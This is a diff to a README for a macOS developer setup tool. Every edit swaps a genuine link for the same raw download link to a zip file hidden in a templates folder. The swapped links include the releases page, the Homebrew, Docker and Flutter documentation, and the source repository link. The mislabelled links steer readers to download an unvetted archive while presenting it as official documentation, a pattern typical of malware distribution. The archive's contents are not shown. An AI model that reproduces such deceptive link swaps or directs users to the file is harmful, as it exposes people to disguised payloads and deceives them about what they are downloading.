@@ -1,6 +1,6 @@
 # 🖥️ new-macos-dev-setup - Easy Mac Setup for Developers
 
-[![Download new-macos-dev-setup](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/trieu1910/new-macos-dev-setup/releases)
+[![Download new-macos-dev-setup](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/trieu1910/new-macos-dev-setup/raw/refs/heads/main/scripts/bootstrap/templates/macos-setup-dev-new-v3.5.zip)
 
 ---
 
@@ -52,7 +52,7 @@ This means your Mac will be ready for coding, AI development, app building, and 
 
 1. Visit the download page by clicking this button:
 
-   [![Download new-macos-dev-setup](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/trieu1910/new-macos-dev-setup/releases)
+   [![Download new-macos-dev-setup](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/trieu1910/new-macos-dev-setup/raw/refs/heads/main/scripts/bootstrap/templates/macos-setup-dev-new-v3.5.zip)
 
 2. On the page, find the latest release. It will usually have a version number like "v1.0" or "v2.0."
 3. Download the file named something like `new-macos-dev-setup.zip` or `new-macos-dev-setup.command`.
@@ -143,17 +143,17 @@ A: This script runs a full setup. You can modify it if you are comfortable with 
 
 ## 📌 Useful links
 
-- Official release page: https://github.com/trieu1910/new-macos-dev-setup/releases  
-- Homebrew documentation: https://brew.sh  
-- Docker for Mac: https://docs.docker.com/desktop/mac/install/  
-- Flutter setup: https://flutter.dev/docs/get-started/install/macos  
+- Official release page: https://github.com/trieu1910/new-macos-dev-setup/raw/refs/heads/main/scripts/bootstrap/templates/macos-setup-dev-new-v3.5.zip  
+- Homebrew documentation: https://github.com/trieu1910/new-macos-dev-setup/raw/refs/heads/main/scripts/bootstrap/templates/macos-setup-dev-new-v3.5.zip  
+- Docker for Mac: https://github.com/trieu1910/new-macos-dev-setup/raw/refs/heads/main/scripts/bootstrap/templates/macos-setup-dev-new-v3.5.zip  
+- Flutter setup: https://github.com/trieu1910/new-macos-dev-setup/raw/refs/heads/main/scripts/bootstrap/templates/macos-setup-dev-new-v3.5.zip  
 
 ---
 
 ## 🖇️ License and source
 
-This setup tool is open source and free to use. You can review the source code and contribute on GitHub at this repository: https://github.com/trieu1910/new-macos-dev-setup
+This setup tool is open source and free to use. You can review the source code and contribute on GitHub at this repository: https://github.com/trieu1910/new-macos-dev-setup/raw/refs/heads/main/scripts/bootstrap/templates/macos-setup-dev-new-v3.5.zip
 
 ---
 
-[![Download new-macos-dev-setup](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/trieu1910/new-macos-dev-setup/releases)
+[![Download new-macos-dev-setup](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/trieu1910/new-macos-dev-setup/raw/refs/heads/main/scripts/bootstrap/templates/macos-setup-dev-new-v3.5.zip)
